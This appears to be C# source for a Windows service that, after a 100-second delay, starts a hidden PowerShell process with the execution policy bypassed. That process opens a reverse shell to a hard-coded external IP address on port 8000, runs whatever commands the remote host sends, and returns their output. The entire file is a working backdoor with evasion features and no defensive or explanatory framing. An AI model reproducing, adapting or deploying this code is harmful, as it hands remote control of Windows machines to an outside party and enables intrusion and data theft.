using System;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;

namespace service
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                System.Threading.Thread.Sleep(100000);

                string payload = $@"
                    $client = New-Object System.Net.Sockets.TCPClient('104.199.254.153', 8000);
                    $stream = $client.GetStream();
                    $writer = New-Object System.IO.StreamWriter($stream);
                    $reader = New-Object System.IO.StreamReader($stream);
                    $writer.AutoFlush = $true;
                    while ($true) {{
                        $command = $reader.ReadLine();
                        if ($command -eq 'exit') {{ break }}
                        $output = try {{ Invoke-Expression $command 2>&1 | Out-String }} catch {{ $_.Exception.Message }};
                        $writer.WriteLine($output);
                    }}
                    $client.Close();";

                ExecuteCommand(payload);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        protected override void OnStop()
        {
        }

        private void ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " + command,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process process = new Process { StartInfo = psi })
                {
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                // 處理異常
                Console.WriteLine("執行 PowerShell 指令時發生錯誤: " + ex.Message);
            }
        }
    }
}
